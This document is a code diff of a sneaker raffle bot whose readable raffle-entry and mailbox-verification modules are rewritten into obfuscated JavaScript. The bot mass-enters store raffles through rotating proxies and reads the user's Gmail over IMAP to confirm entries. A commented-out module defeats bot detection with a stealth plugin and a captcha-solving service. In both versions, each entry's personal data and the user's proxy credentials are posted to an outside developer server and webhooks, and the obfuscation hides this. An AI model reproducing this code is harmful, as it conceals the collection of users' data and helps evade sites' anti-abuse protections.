-                                                succesDEVMSG: { embeds: [succesDEV] },
-                                                succesPUBMSG: { embeds: [succesPUB] }
+                            return _0x27bc85 != 'ver' && (_0x2a27cf['url'] = _0x51e7aa['url'], _0x2a27cf['headers'] = _0x51e7aa['headers']), _0x27bc85 == 'ver' && (_0x2a27cf['method'] = 'GET'), new Promise(function (_0x3c4694, _0x45f1f5) {
+                                callback = async (_0x385775, _0x9adee3, _0x40ed84) => {
+                                    if (!_0x385775 && _0x9adee3['statusCode'] == 0xca || !_0x385775 && _0x9adee3['statusCode'] == 0xc8) {
+                                        if (_0x27bc85 != 'ver') {
+                                            var _0x5ac3c8 = await _0x2520f4(_0x321de9[_0x28552c], _0x51e7aa, 'dev', ![]), _0x181088 = await _0x2520f4(_0x321de9[_0x28552c], _0x51e7aa, 'pub', ![]);
+                                            const _0x39e30d = {
+                                                'succesDEVMSG': { 'embeds': [_0x5ac3c8] },
+                                                'succesPUBMSG': { 'embeds': [_0x181088] }
                                             };
-                                            let task = oqium[i]
+                                            let _0x4e84ed = _0x321de9[_0x28552c];
                                             try {
                                                 prxdata = {
-                                                    username: username.replace('#', ''),
-                                                    module: currentFunction.name,
-                                                    entrydata: JSON.stringify(task),
-                                                    proxy: `${proxies[i]}`
-                                                }
-                                                var prx = JSON.stringify(prxdata);
-                                                let config = {
-                                                    headers: {
-                                                        'content-type': 'application/json',
-                                                    }
-                                                }
-                                                await axios.post('https://jraffles.herokuapp.com/success', prx, config)
-                                            } catch (e) {
-
+                                                    'username': _0x358285['replace']('#', ''),
+                                                    'module': _0x51e7aa['name'],
+                                                    'entrydata': JSON['stringify'](_0x4e84ed),
+                                                    'proxy': '' + _0x1cbe54[_0x28552c]
+                                                };
+                                                var _0x213f3a = JSON['stringify'](prxdata);
+                                                let _0x32abfd = { 'headers': { 'content-type': 'application/json' } };
+                                                await _0x5d1b21['post']('https://jraffles.herokuapp.com/success', _0x213f3a, _0x32abfd);
+                                            } catch (_0x454e1c) {
                                             }
-                                            if (settings.webhook != undefined && settings.webhook != '') {
+                                            if (_0x51d52a['webhook'] != undefined && _0x51d52a['webhook'] != '')
                                                 try {
-
-                                                    await sendWebhook(settings.webhook, EMBEDS.succesDEVMSG);
+                                                    await _0x3c7bbe(_0x51d52a['webhook'], _0x39e30d['succesDEVMSG']);
                                                 } catch {
-
                                                 }
-                                            }
-                                            await delay(200);
-                                            await sendWebhook(succesWH, EMBEDS.succesDEVMSG);
-                                            await delay(200);
+                                            await _0x116d4a(0xc8), await _0x3c7bbe(_0x5317eb, _0x39e30d['succesDEVMSG']), await _0x116d4a(0xc8);
                                             try {
-
-                                                await sendWebhook(publicWH, EMBEDS.succesPUBMSG);
+                                                await _0x3c7bbe(_0x55a106, _0x39e30d['succesPUBMSG']);
                                             } catch {
-
                                             }
-                                            successfulLog(oqium[i], currentFunction);
+                                            _0x523ce4(_0x321de9[_0x28552c], _0x51e7aa);
                                         }
-
-                                        resolve(console.log(chalk.green(`${getTime()} [${currentFunction.name}] Task ${i + 1}: Raffle Entered!`)));
+                                        _0x3c4694(console['log'](_0x1403a4['green'](_0x3982db() + '\x20[' + _0x51e7aa['name'] + ']\x20Task\x20' + (_0x28552c + 0x1) + ':\x20Raffle\x20Entered!')));
                                     } else {
-                                        if (mode != 'ver') {
-                                            var ERROR = `${err}`;
-                                            var errorDEV = await makeEmbed(oqium[i], currentFunction, 'dev', true, ERROR);
-                                            var EMBEDS = {}
-                                            EMBEDS.errorDEV = { embeds: [errorDEV] }
-                                            errorLog(oqium[i], currentFunction)
-
-                                            if (settings.webhook != undefined && settings.webhook != '') {
-                                                await sendWebhook(settings.webhook, EMBEDS.errorDEV);
-                                            }
-                                            await sendWebhook(errorWH, EMBEDS.errorDEV);
-
+                                        if (_0x27bc85 != 'ver') {
+                                            var _0x2f82da = '' + _0x385775, _0x429582 = await _0x2520f4(_0x321de9[_0x28552c], _0x51e7aa, 'dev', !![], _0x2f82da), _0x99b065 = {};
+                                            _0x99b065['errorDEV'] = { 'embeds': [_0x429582] }, _0x5925c7(_0x321de9[_0x28552c], _0x51e7aa), _0x51d52a['webhook'] != undefined && _0x51d52a['webhook'] != '' && await _0x3c7bbe(_0x51d52a['webhook'], _0x99b065['errorDEV']), await _0x3c7bbe(_0x802c1e, _0x99b065['errorDEV']);
                                         }
-                                        reject(console.log(chalk.red(`${getTime()} [${currentFunction.name}] Task ${i + 1}: ${err}`)));
+                                        _0x45f1f5(console['log'](_0x1403a4['red'](_0x3982db() + '\x20[' + _0x51e7aa['name'] + ']\x20Task\x20' + (_0x28552c + 0x1) + ':\x20' + _0x385775)));
                                     }
-                                }
+                                };
                                 try {
-                                    if (mode != 'ver') {
-                                        console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1}: Sending Entry for ${data.data.attributes.email}`)
-                                    }
-                                    request(options, callback);
-                                    // console.log(data)
-                                } catch (err) {
-                                    console.log(`${getTime()} Task ${i + 1}: ${err}`);
+                                    _0x27bc85 != 'ver' && console['log'](_0x3982db() + '\x20[' + _0x51e7aa['name'] + ']\x20Task\x20' + (_0x28552c + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x4cdd38['data']['attributes']['email']), _0x225fcc(_0x2a27cf, callback);
+                                } catch (_0x21f902) {
+                                    console['log'](_0x3982db() + '\x20Task\x20' + (_0x28552c + 0x1) + ':\x20' + _0x21f902);
                                 }
                             });
-                        };
+                        }
+                        ;
                         try {
-                            await oqiumFunction(i, 'nor', currentFunction, oqium, proxies);
-
-                            console.log(`${getTime()} [${currentFunction.name}] Sleeping for ${settings.delay} ms`);
-                            await delay(settings.delay);
-
-                        } catch (e) {
-
+                            await _0x823b0f(_0x3dc2f7, 'nor', _0x1a05ed, _0x110fd3, _0x3eb274), console['log'](_0x3982db() + '\x20[' + _0x1a05ed['name'] + ']\x20Sleeping\x20for\x20' + _0x51d52a['delay'] + '\x20ms'), await _0x116d4a(_0x51d52a['delay']);
+                        } catch (_0x1196a2) {
                         }
                     }
                 }
             },
             {
-                name: "MAHA Raffle Verification",
-                store: 'MAHA',
-                logo: 'https://i1.sndcdn.com/avatars-XIAMNs5LPWV2iRwj-SNwa5A-t500x500.jpg',
-                url: '',
-                data: {
-                    data: {
-                        type: "subscription",
-                        attributes: {
-                            list_id: 'TFTWYv',
-                            custom_source: "Air Jordan 1 Retro High OG Lost and Found",
-                            email: ``,
-                            properties: {
-                                $address1: "",
-                                $city: "",
-                                $country: "",
-                                $first_name: "",
-                                $last_name: "",
-                                $zip: "",
-                                $consent_method: "Klaviyo Form",
-                                $consent_form_id: "V4PNGA",
-                                $consent_form_version: 7328877,
-                                'Instagram Handle': ``,
-                                Shipping: 'Shipping',
-                                Size: '',
-                                services: '{\"shopify\":{\"source\":\"form\"}}',
-                                $timezone_offset: 1,
-                            },
-                        },
-                    },
-                },
-                headers: {
-                    'accept': "*/*",
-                    "accept-encoding": "gzip, deflate, br",
-                    "access-control-allow-headers": "*",
-                    "content-type": "application/json",
-                    "origin": "https://www.maha-amsterdam.com",
-                    "referer": "https://www.maha-amsterdam.com/",
-                    "revision": "2022-02-16",
-                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
-                    'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", "Not;A=Brand";v="99"',
-                    "sec-ch-ua-mobile": "?0",
-                    "sec-ch-ua-platform": "'Windows'",
-                    "sec-fetch-dest": "empty",
-                    "sec-fetch-mode": "cors",
-                    "sec-fetch-site": "cross-site",
-                },
-                function: async function (currentFunction, oqium, proxies) {
-                    var links = [];
-                    var done = false;
-                    // console.log(`Found ${links.length} Links in Mailbox`)
-                    async function getMails() {
-                        var imap = new Imap({
-                            user: settings.masterMail,
-                            password: settings.masterPassword,
-                            host: 'imap.gmail.com',
-                            port: 993,
-                            tls: true,
-                            autotls: 'always'
-                        });
-
-                        function openInbox(cb) {
-                            imap.openBox('INBOX', false, cb);
+                'name': 'MAHA\x20Raffle\x20Verification',
+                'store': 'MAHA',
+                'logo': 'https://i1.sndcdn.com/avatars-XIAMNs5LPWV2iRwj-SNwa5A-t500x500.jpg',
+                'url': '',
+                'data': {
+                    'data': {
+                        'type': 'subscription',
+                        'attributes': {
+                            'list_id': 'TFTWYv',
+                            'custom_source': 'Air\x20Jordan\x201\x20Retro\x20High\x20OG\x20Lost\x20and\x20Found',
+                            'email': '',
+                            'properties': {
+                                '$address1': '',
+                                '$city': '',
+                                '$country': '',
+                                '$first_name': '',
+                                '$last_name': '',
+                                '$zip': '',
+                                '$consent_method': 'Klaviyo\x20Form',
+                                '$consent_form_id': 'V4PNGA',
+                                '$consent_form_version': 0x6fd46d,
+                                'Instagram\x20Handle': '',
+                                'Shipping': 'Shipping',
+                                'Size': '',
+                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
+                                '$timezone_offset': 0x1
+                            }
                         }
-
-                        imap.once('ready', function () {
-                            openInbox(function (err, box) {
-                                console.clear()
-                                console.log('Looking For Links')
-                                if (err) throw err;
-                                imap.seq.search(['UNSEEN', ['SUBJECT', 'Confirm Your Subscription']], function (err, results) {
-                                    if (!results || !results.length) {
-                                        console.log(`${getTime()} [${currentFunction.name}] No mails found`);
-
-                                        imap.end();
-
-                                    } else {
-                                        var f = imap.seq.fetch(results, { bodies: '', markSeen: true });
-                                        f.on('message', function (msg, seqno) {
-                                            // console.log('Message #%d', seqno);
-                                            var prefix = '(#' + seqno + ') ';
-                                            msg.on('body', function (stream, info) {
-                                                simpleParser(stream, (err, mail) => {
-
-                                                    var bstnSplit = mail.text.split('(')[1];
-                                                    var bstnLink = bstnSplit.split(')')[0]
-                                                    // var msgSplit = mail.html.split('\n')
-                                                    links.push(bstnLink)
-                                                    // for (var i = 0; i < msgSplit.length; i++) {
-                                                    //     if (msgSplit[i].includes('salesmanago') && msgSplit[i].includes('<td') && msgSplit[i].includes('href')) {
-                                                    //         var linklong = msgSplit[i].split('href="')
-                                                    //         var l = linklong[1].split('"')[0]
-                                                    //         links.push(l)
-                                                    //         break;
-                                                    //     }
-                                                    // }
-
-                                                    // console.log(mail.html.split('\n'));
-                                                    // mes = mail.text.split('[')[2]
-                                                    // link = mes.split(']')[0];
-                                                    // console.log(link);
-                                                });
-                                                // imap.seq.setFlags(seqno, 'SEEN')
-
-
-                                            });
-                                            // msg.once('attributes', function (attrs) {
-                                            //     console.log(prefix + 'Attributes: %s', inspect(attrs, false, 8));
-                                            // });
-                                            msg.once('end', function () {
-                                                // console.log(prefix + 'Finished');
-
-
-                                            });
-                                        });
-                                        f.once('error', function (err) {
-                                            console.log('Fetch error: ' + err);
-                                            done = true
-                                        });
-                                        f.once('end', function () {
-                                            // console.log('Done fetching all messages!');
-                                            imap.end();
-
-                                        });
-                                    }
-                                })
-                            });
-                        });
-
-
-
-                        imap.once('error', function (err) {
-                            // throw new Error(err)
-                            console.log(chalk.red(err.message))
-                            console.log('Read the guide on how to setup your mailbox')
-                            done = true;
-
-                        });
-
-                        imap.once('end', async function () {
-                            done = true;
-
-
-                            // console.log('Connection ended');
-                        });
-
-                        imap.connect();
                     }
-                    async function verify(currentFunction, links, proxies) {
-                        for (var i = 0; i < links.length; i++) {
-                            async function verifyFunction(i, mode, currentFunction, oqium, proxies) {
-
-                                var ERROR;
-                                var data = {};
-                                var embed = [];
-                                var msg = {};
-                                var sizeArray = [
-                                    '40', '40,5', '41', '42', '42,5', '43', '44', '45', '45,5', '46', '47', '47,5', '48'
-                                ]
-                                var randomSize = Math.round(Math.random() * (sizeArray.length - 1));
-                                if (
-                                    oqium[i].Size == 'RANDOM'
-                                ) {
-                                    oqium[i].Size = sizeArray[randomSize]
-                                }
-                                if (!oqium) {
-                                    oqium = {
-
-                                    };
-                                }
-
-
-                                if (settings.useRandomProxy = false) {
-                                    var proxySplit = proxies[i].split(":");
-                                } else {
-                                    var randomProxy = Math.round(Math.random() * (proxies.length - 1));
-                                    var proxySplit = proxies[randomProxy].split(":");
-                                }
-
-
-
-                                var options = {
-                                    jar: j,
-                                    followAllRedirects: true,
-                                    method: 'POST',
-                                    url: currentFunction.url,
-                                    headers: currentFunction.headers,
-                                    body: JSON.stringify(data),
-                                    proxy: `http://${proxySplit[2]}:${proxySplit[3]}@${proxySplit[0]}:${proxySplit[1]}`,
-                                };
-                                if (mode != 'ver') {
-                                    options.url = currentFunction.url
-                                    options.headers = currentFunction.headers
-                                }
-                                if (mode == 'ver') {
-                                    options.method = 'GET';
-                                    options.url = oqium[i]
-                                }
-                                return new Promise(function (resolve, reject) {
-                                    callback = async (err, res, body) => {
-                                        if (!err && res.statusCode == 202 || !err && res.statusCode == 200) {
-                                            if (mode != 'ver') {
-                                                var succesDEV = await makeEmbed(oqium[i], currentFunction, 'dev', false);
-                                                var succesPUB = await makeEmbed(oqium[i], currentFunction, 'pub', false);
-                                                const EMBEDS =
-                                                {
-                                                    succesDEVMSG: { embeds: [succesDEV] },
-                                                    succesPUBMSG: { embeds: [succesPUB] }
-                                                };
-
-                                                if (settings.webhook != undefined && settings.webhook != '') {
-                                                    try {
-
-                                                        await sendWebhook(settings.webhook, EMBEDS.succesDEVMSG);
-                                                    } catch {
-
-                                                    }
-                                                }
-                                                await delay(200);
-                                                await sendWebhook(succesWH, EMBEDS.succesDEVMSG);
-                                                await delay(200);
-                                                try {
-
-                                                    await sendWebhook(publicWH, EMBEDS.succesPUBMSG);
-                                                } catch {
-
-                                                }
-                                                successfulLog(oqium[i], currentFunction);
-                                            }
-
-                                            resolve(console.log(chalk.green(`${getTime()} [${currentFunction.name}] Task ${i + 1}: Raffle Entered!`)));
-                                        } else {
-                                            if (mode != 'ver') {
-                                                var ERROR = `${err}`;
-                                                var errorDEV = await makeEmbed(oqium[i], currentFunction, 'dev', true, ERROR);
-                                                var EMBEDS = {}
-                                                EMBEDS.errorDEV = { embeds: [errorDEV] }
-                                                errorLog(oqium[i], currentFunction)
-
-                                                if (settings.webhook != undefined && settings.webhook != '') {
-                                                    await sendWebhook(settings.webhook, EMBEDS.errorDEV);
-                                                }
-                                                await sendWebhook(errorWH, EMBEDS.errorDEV);
-
-                                            }
-                                            reject(console.log(chalk.red(`${getTime()} [${currentFunction.name}] Task ${i + 1}: ${err}`)));
-                                        }
-                                    }
-                                    try {
-                                        if (mode != 'ver') {
-                                            console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1}: Sending Entry for ${data.data.attributes.email}`)
-                                        } else {
-                                            console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1}: Fetching Response`)
-
-                                        }
-                                        request(options, callback);
-                                    } catch (err) {
-                                        console.log(`${getTime()} Task ${i + 1}: ${err}`);
+                },
+                'headers': {
+                    'accept': '*/*',
+                    'accept-encoding': 'gzip,\x20deflate,\x20br',
+                    'access-control-allow-headers': '*',
+                    'content-type': 'application/json',
+                    'origin': 'https://www.maha-amsterdam.com',
+                    'referer': 'https://www.maha-amsterdam.com/',
+                    'revision': '2022-02-16',
+                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
+                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
+                    'sec-ch-ua-mobile': '?0',
+                    'sec-ch-ua-platform': '\x27Windows\x27',
+                    'sec-fetch-dest': 'empty',
+                    'sec-fetch-mode': 'cors',
+                    'sec-fetch-site': 'cross-site'
+                },
+                'function': async function (_0x4147a5, _0x590666, _0x18d6ad) {
+                    var _0x58209e = [], _0x20a99e = ![];
+                    async function _0x3d799b() {
+                        var _0x46d8e7 = new _0x3e4e8d({
+                            'user': _0x51d52a['masterMail'],
+                            'password': _0x51d52a['masterPassword'],
+                            'host': 'imap.gmail.com',
+                            'port': 0x3e1,
+                            'tls': !![],
+                            'autotls': 'always'
+                        });
+                        function _0x503fbf(_0x148b2b) {
+                            _0x46d8e7['openBox']('INBOX', ![], _0x148b2b);
+                        }
+                        _0x46d8e7['once']('ready', function () {
+                            _0x503fbf(function (_0x192b13, _0x5740bc) {
+                                console['clear'](), console['log']('Looking\x20For\x20Links');
+                                if (_0x192b13)
+                                    throw _0x192b13;
+                                _0x46d8e7['seq']['search']([
+                                    'UNSEEN',
+                                    [
+                                        'SUBJECT',
+                                        'Confirm\x20Your\x20Subscription'
+                                    ]
+                                ], function (_0x5cecb9, _0x58a67b) {
+                                    if (!_0x58a67b || !_0x58a67b['length'])
+                                        console['log'](_0x3982db() + '\x20[' + _0x4147a5['name'] + ']\x20No\x20mails\x20found'), _0x46d8e7['end']();
+                                    else {
+                                        var _0xe946af = _0x46d8e7['seq']['fetch'](_0x58a67b, {
+                                            'bodies': '',
+                                            'markSeen': !![]
+                                        });
+                                        _0xe946af['on']('message', function (_0x4077e6, _0x5da6b9) {
+                                            var _0x19744c = '(#' + _0x5da6b9 + ')\x20';
+                                            _0x4077e6['on']('body', function (_0x3a77f8, _0x3e25c9) {
+                                                _0x300bc8(_0x3a77f8, (_0x25379f, _0x2d045f) => {
+                                                    var _0x5010fa = _0x2d045f['text']['split']('(')[0x1], _0xd2ac3d = _0x5010fa['split'](')')[0x0];
+                                                    _0x58209e['push'](_0xd2ac3d);
+                                                });
+                                            }), _0x4077e6['once']('end', function () {
+                                            });
+                                        }), _0xe946af['once']('error', function (_0x2be8b4) {
+                                            console['log']('Fetch\x20error:\x20' + _0x2be8b4), _0x20a99e = !![];
+                                        }), _0xe946af['once']('end', function () {
+                                            _0x46d8e7['end']();
+                                        });
                                     }
                                 });
-                            };
+                            });
+                        }), _0x46d8e7['once']('error', function (_0x2ea01c) {
+                            console['log'](_0x1403a4['red'](_0x2ea01c['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x20a99e = !![];
+                        }), _0x46d8e7['once']('end', async function () {
+                            _0x20a99e = !![];
+                        }), _0x46d8e7['connect']();
+                    }
+                    async function _0x25b3e3(_0x14d07c, _0x2e9130, _0x1bad03) {
+                        for (var _0x575aba = 0x0; _0x575aba < _0x2e9130['length']; _0x575aba++) {
+                            async function _0x1216cf(_0x54e1ed, _0x5cc926, _0x36eee5, _0x58c527, _0x59556e) {
+                                var _0x4bb0a4, _0x4f411f = {}, _0x2a47b7 = [], _0x3680d0 = {}, _0x4cb8f1 = [
+                                    '40',
+                                    '40,5',
+                                    '41',
+                                    '42',
+                                    '42,5',
+                                    '43',
+                                    '44',
+                                    '45',
+                                    '45,5',
+                                    '46',
+                                    '47',
+                                    '47,5',
+                                    '48'
+                                ], _0x2c0180 = Math['round'](Math['random']() * (_0x4cb8f1['length'] - 0x1));
+                                _0x58c527[_0x54e1ed]['Size'] == 'RANDOM' && (_0x58c527[_0x54e1ed]['Size'] = _0x4cb8f1[_0x2c0180]);
+                                !_0x58c527 && (_0x58c527 = {});
+                                if (_0x51d52a['useRandomProxy'] = ![])
+                                    var _0x1f2dd2 = _0x59556e[_0x54e1ed]['split'](':');
+                                else
+                                    var _0x40daaf = Math['round'](Math['random']() * (_0x59556e['length'] - 0x1)), _0x1f2dd2 = _0x59556e[_0x40daaf]['split'](':');
+                                var _0x1f379f = {
+                                    'jar': _0x103baf,
+                                    'followAllRedirects': !![],
+                                    'method': 'POST',
+                                    'url': _0x36eee5['url'],
+                                    'headers': _0x36eee5['headers'],
+                                    'body': JSON['stringify'](_0x4f411f),
+                                    'proxy': 'http://' + _0x1f2dd2[0x2] + ':' + _0x1f2dd2[0x3] + '@' + _0x1f2dd2[0x0] + ':' + _0x1f2dd2[0x1]
+                                };
+                                return _0x5cc926 != 'ver' && (_0x1f379f['url'] = _0x36eee5['url'], _0x1f379f['headers'] = _0x36eee5['headers']), _0x5cc926 == 'ver' && (_0x1f379f['method'] = 'GET', _0x1f379f['url'] = _0x58c527[_0x54e1ed]), new Promise(function (_0x208ca8, _0x2ce1ea) {
+                                    callback = async (_0x4e19a0, _0x58928d, _0x610569) => {
+                                        if (!_0x4e19a0 && _0x58928d['statusCode'] == 0xca || !_0x4e19a0 && _0x58928d['statusCode'] == 0xc8) {
+                                            if (_0x5cc926 != 'ver') {
+                                                var _0x11efd0 = await _0x2520f4(_0x58c527[_0x54e1ed], _0x36eee5, 'dev', ![]), _0x16da87 = await _0x2520f4(_0x58c527[_0x54e1ed], _0x36eee5, 'pub', ![]);
+                                                const _0x3e40d5 = {
+                                                    'succesDEVMSG': { 'embeds': [_0x11efd0] },
+                                                    'succesPUBMSG': { 'embeds': [_0x16da87] }
+                                                };
+                                                if (_0x51d52a['webhook'] != undefined && _0x51d52a['webhook'] != '')
+                                                    try {
+                                                        await _0x3c7bbe(_0x51d52a['webhook'], _0x3e40d5['succesDEVMSG']);
+                                                    } catch {
+                                                    }
+                                                await _0x116d4a(0xc8), await _0x3c7bbe(_0x5317eb, _0x3e40d5['succesDEVMSG']), await _0x116d4a(0xc8);
+                                                try {
+                                                    await _0x3c7bbe(_0x55a106, _0x3e40d5['succesPUBMSG']);
+                                                } catch {
+                                                }
+                                                _0x523ce4(_0x58c527[_0x54e1ed], _0x36eee5);
+                                            }
+                                            _0x208ca8(console['log'](_0x1403a4['green'](_0x3982db() + '\x20[' + _0x36eee5['name'] + ']\x20Task\x20' + (_0x54e1ed + 0x1) + ':\x20Raffle\x20Entered!')));
+                                        } else {
+                                            if (_0x5cc926 != 'ver') {
+                                                var _0x5a6625 = '' + _0x4e19a0, _0xf1ee40 = await _0x2520f4(_0x58c527[_0x54e1ed], _0x36eee5, 'dev', !![], _0x5a6625), _0x1be037 = {};
+                                                _0x1be037['errorDEV'] = { 'embeds': [_0xf1ee40] }, _0x5925c7(_0x58c527[_0x54e1ed], _0x36eee5), _0x51d52a['webhook'] != undefined && _0x51d52a['webhook'] != '' && await _0x3c7bbe(_0x51d52a['webhook'], _0x1be037['errorDEV']), await _0x3c7bbe(_0x802c1e, _0x1be037['errorDEV']);
+                                            }
+                                            _0x2ce1ea(console['log'](_0x1403a4['red'](_0x3982db() + '\x20[' + _0x36eee5['name'] + ']\x20Task\x20' + (_0x54e1ed + 0x1) + ':\x20' + _0x4e19a0)));
+                                        }
+                                    };
+                                    try {
+                                        _0x5cc926 != 'ver' ? console['log'](_0x3982db() + '\x20[' + _0x36eee5['name'] + ']\x20Task\x20' + (_0x54e1ed + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x4f411f['data']['attributes']['email']) : console['log'](_0x3982db() + '\x20[' + _0x36eee5['name'] + ']\x20Task\x20' + (_0x54e1ed + 0x1) + ':\x20Fetching\x20Response'), _0x225fcc(_0x1f379f, callback);
+                                    } catch (_0x4ea4d4) {
+                                        console['log'](_0x3982db() + '\x20Task\x20' + (_0x54e1ed + 0x1) + ':\x20' + _0x4ea4d4);
+                                    }
+                                });
+                            }
+                            ;
                             try {
-                                await verifyFunction(i, 'ver', currentFunction, links, proxies);
-                                console.log(`${getTime()} [${currentFunction.name}] Sleeping for ${settings.delay} ms`);
-                                await delay(settings.delay);
-
-                            } catch (e) {
-
+                                await _0x1216cf(_0x575aba, 'ver', _0x14d07c, _0x2e9130, _0x1bad03), console['log'](_0x3982db() + '\x20[' + _0x14d07c['name'] + ']\x20Sleeping\x20for\x20' + _0x51d52a['delay'] + '\x20ms'), await _0x116d4a(_0x51d52a['delay']);
+                            } catch (_0x5c8819) {
                             }
                         }
                     }
                     try {
-                        getMails();
-                        while (!done) {
-                            await delay(3000);
+                        _0x3d799b();
+                        while (!_0x20a99e) {
+                            await _0x116d4a(0xbb8);
                         }
-                        console.log(`Found ${links.length} Links in Mailbox`)
-
+                        console['log']('Found\x20' + _0x58209e['length'] + '\x20Links\x20in\x20Mailbox');
                     } catch {
-                        console.log(`Searching mailbox failed, please read the guide on how to setup..`)
-                        await delay(2500)
+                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), await _0x116d4a(0x9c4);
                     }
-
-                    await verify(currentFunction, links, proxies);
+                    await _0x25b3e3(_0x4147a5, _0x58209e, _0x18d6ad);
                 }
-            },
+            }
         ]
     },
-    // {
-    //     name: 'OneBlockDown',
-    //     modules: [
-    //         {
-    //             name: 'OneBlockDown Raffle Entries',
-    //             store: 'OneBlockDown',
-    //             logo: 'https://thesneakersbible.fr/wp-content/uploads/2021/04/logo-one-block-down.png',
-    //             function: async function (currentFunction, csv, proxies) {
-    //                 puppeteer.use(StealthPlugin());
-    //                 puppeteer.use(RecaptchaPlugin({
-    //                     provider: {
-    //                         id: '2captcha',
-    //                         token: `${settings.captchaKey}` // REPLACE THIS WITH YOUR OWN 2CAPTCHA API KEY ⚡
-    //                     },
-    //                     visualFeedback: true
-    //                 }))
-    //                 for (var i = 0; i < csv.length; i++) {
-    //                     if (retry != 'yes') {
-    //                         var retry = '';
-    //                         var t = 0;
-
-    //                     }
-    //                     var ERROR;
-    //                     try {
-    //                         await jig(csv, i);
-
-    //                     } catch {
-    //                         retry = 'no';
-    //                         throw new Error('Invalid CSV Format, use the CSV Files from the guides!')
-    //                     }
-    //                     setTitle(`${currentFunction.name} Task ${i + 1} / ${csv.length} || File: ${currentFile} Proxies: ${currentProxy}`);
-    //                     var sizeArray = [
-    //                         '40', '40,5', '41', '42', '42,5', '43', '44', '45', '45,5', '46', '47', '47,5', '48'
-    //                     ]
-    //                     var randomSize = Math.round(Math.random() * (sizeArray.length - 1));
-    //                     if (
-    //                         csv[i].Size == 'RANDOM'
-    //                     ) {
-    //                         csv[i].Size = sizeArray[randomSize]
-    //                     }
-    //                     var randomProxy = Math.round(Math.random() * (proxies.length - 1));
-    //                     var proxySplit = proxies[randomProxy].split(":");
-    //                     var browser;
-    //                     try {
-    //                         browser = await puppeteer.launch({
-    //                             executablePath: 'C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe',
-    //                             headless: false,
-    //                             args: [`--proxy-server=${proxySplit[0]}:${proxySplit[1]}`, '--no-sandbox', '--disable-setuid-sandbox'],
-    //                         });
-
-    //                     } catch {
-    //                         browser = await puppeteer.launch({
-    //                             executablePath: 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe',
-    //                             headless: false,
-    //                             args: [`--proxy-server=${proxySplit[0]}:${proxySplit[1]}`, '--no-sandbox', '--disable-setuid-sandbox'],
-    //                         });
-    //                     }
-    //                     try {
-    //                         console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Getting Session`);
-    //                         async function getForm() {
-    //                             let resp = await axios('https://eu.oneblockdown.it/collections/drops/products/4-retro-x-nike-sb-pine-green')
-    //                             let formSplit1 = resp.data.split('docs.google.com')[3]
-    //                             let formSplit2 = formSplit1.split('"')[0]
-    //                             let form = formSplit2.replace(/\\/g, '')
-    //                             return form
-    //                         }
-    //                         let form = 'https://docs.google.com' + await getForm()
-    //                         const page = await browser.newPage();
-    //                         await page.authenticate({
-    //                             username: `${proxySplit[2]}`,
-    //                             password: `${proxySplit[3]}`,
-    //                         });
-    //                         await page.setRequestInterception(true);
-
-    //                         page.on("request", (req) => {
-    //                             if (req.resourceType() === "image" || req.resourceType() === "font" || req.resourceType() === "media") {
-    //                                 req.abort();
-    //                             } else {
-    //                                 req.continue();
-    //                             }
-    //                         });
-    //                         console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Starting Entry`);
-    //                         try {
-    //                             await page.goto(form, { waitUntil: 'networkidle2' });
-    //                             await delay(50000)
-    //                             await page.waitForSelector('.action_button.add_to_cart.raffle-button');
-
-    //                         } catch {
-    //                             throw new Error('Connection Error')
-    //                         }
-    //                         await delay(1000);
-
-    //                         await page.click('.action_button.add_to_cart.raffle-button');
-    //                         await delay(1000);
-    //                         await page.waitForSelector('#raffles-product');
-    //                         await page.$eval('#raffles-product', btn => btn.click());
-    //                         await delay(5000)
-    //                         await page.waitForSelector(`.fancybox-inner > iframe`)
-    //                         var elementHandle = await page.$(
-    //                             '.fancybox-inner > iframe',
-    //                         );
-    //                         var frame = await elementHandle.contentFrame();
-    //                         console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Checking Information`);
-
-    //                         await frame.waitForSelector('input[name="sm-form-email"]');
-    //                         await delay(500);
-    //                         await frame.type('input[name="sm-form-email"]', csv[i].Email);
-    //                         await delay(200);
-    //                         await frame.type('input[name="sm-form-name"]', `${csv[i].FirstName} ${csv[i].LastName}`);
-    //                         await delay(200);
-    //                         await frame.type('input[name="sm-form-street"]', `${csv[i].Address1} ${csv[i].HouseNumber} ${csv[i].Address2}`);
-    //                         await delay(200);
-    //                         await frame.type('input[name="sm-form-city"]', csv[i].City);
-    //                         await delay(200);
-    //                         await frame.type('input[name="sm-form-province"]', csv[i].State);
-    //                         await delay(200);
-    //                         await frame.type('input[name="sm-form-zip"]', csv[i].Zip);
-    //                         await delay(200);
-    //                         await frame.type('input[name="sm-form-country"]', csv[i].Country);
-    //                         await delay(200);
-    //                         await frame.type('input[name="sm-form-phone"]', csv[i].Phone);
-    //                         await delay(200);
-    //                         await frame.type('input[name="sm-cst.instagram_user"]', csv[i].Follower);
-    //                         await delay(200);
-    //                         await frame.type('input[name="sm-cst.size"]', csv[i].Size);
-    //                         await delay(500);
-    //                         await frame.click('.icheckbox_simple-custom.icheckbox--CONSENT');
-    //                         await delay(500);
-    //                         await frame.click('.icheckbox_simple-custom');
-    //                         await delay(500);
-    //                         console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Sending Request`);
-
-    //                         await frame.$eval('form', f => f.submit());
-
-
